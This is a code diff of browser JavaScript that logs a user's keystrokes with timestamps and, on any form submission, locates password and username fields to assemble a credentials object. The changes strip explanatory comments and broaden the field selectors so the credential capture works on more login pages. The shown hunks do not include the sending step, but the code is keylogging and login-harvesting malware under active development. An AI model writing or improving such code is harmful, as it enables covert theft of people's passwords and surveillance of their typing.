@@ -25,18 +25,12 @@ function sendKeystrokes() {
             timestamp: new Date().toISOString(),
         });
 
-        lastText = typedText; // Update last recorded text
+        lastText = typedText;
     }
 
-    typedText = ""; // Reset for new input
+    typedText = "";
 }
 
-/**
- * Compute the difference between old and new text
- * @param {string} oldText - The last saved text
- * @param {string} newText - The current text input
- * @returns {string} - Only the new changes
- */
 function computeDiff(oldText, newText) {
     let start = 0;
     while (start < oldText.length && start < newText.length && oldText[start] === newText[start]) {
@@ -64,16 +58,26 @@ function computeDiff(oldText, newText) {
 document.addEventListener("submit", (event) => {
     const form = event.target;
     const passwordField = form.querySelector(
-        'input[type="password"], input[name*="pass"], input[id*="pass"], input[class*="password"]'
-    );
-    const usernameField = form.querySelector(
-        'input[type="text"], input[type="email"], input[type="tel"], ' +
-        'input[name*="user"], input[name*="login"], input[name*="email-or-phone"], ' +
-        'input[id*="user"], input[id*="login"], input[autocomplete="username"], ' +
-        'input[autocomplete="email"], input[placeholder*="email"], input[placeholder*="phone"], ' +
-        'input[data-tracking-control-name*="email"], input[class*="input__"], input[class*="login"], ' +
-        'input[class*="ds-input__input"]'
-    );
+    'input[type="password"], ' +
+    'input[name*="pass" i], input[id*="pass" i], input[class*="password" i], ' +
+    'input[autocomplete="current-password"], input[autocomplete="new-password"], ' +
+    'input[placeholder*="password" i], input[data-testid*="password" i], ' +
+    'input[data-automation*="password" i]'
+);
+
+const usernameField = form.querySelector(
+    'input[type="text"], input[type="email"], input[type="tel"], ' +
+    'input[name*="user" i], input[name*="login" i], input[name*="email-or-phone" i], ' +
+    'input[id*="user" i], input[id*="login" i], input[id*="identifier" i], ' +
+    'input[autocomplete="username"], input[autocomplete="email"], ' +
+    'input[placeholder*="email" i], input[placeholder*="phone" i], ' +
+    'input[placeholder*="user" i], input[placeholder*="login" i], ' +
+    'input[data-tracking-control-name*="email" i], ' +
+    'input[class*="input__" i], input[class*="login" i], input[class*="ds-input__input" i], ' +
+    'input[data-testid*="username" i], input[data-testid*="email" i], ' +
+    'input[data-automation*="username" i]'
+);
+
 
     if (passwordField && usernameField) {
         const credentials = {
